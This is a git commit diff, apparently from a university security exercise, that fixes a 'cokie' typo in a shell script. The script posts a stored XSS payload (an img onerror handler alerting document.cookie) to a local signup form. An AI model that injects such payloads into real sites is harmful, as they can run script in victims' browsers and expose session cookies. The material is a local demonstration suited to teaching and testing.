ef80cb951e9bf24024d9fb3567e89dabb20a9c9e
Axel Smeets <dat12asm@student.lu.se>
2015-09-26 21:14:33 +0200

    fix cokie --> cookie typo in stored xss

--- stored-xss.sh
+++ stored-xss.sh
@@ -3,6 +3,6 @@
 curl -X POST localhost/signup.php \
 	-d "email=hejsan@curl" \
 	-d "name=curl4hax" \
-	-d "address=<img src=x onerror=\"alert('here are your cookies'); alert(document.cokie);\"\/>" \
+	-d "address=<img src=x onerror=\"alert('here are your cookies'); alert(document.cookie);\"\/>" \
 	-d "password=allizwell123" \
 	-d "password_repeat=allizwell123"
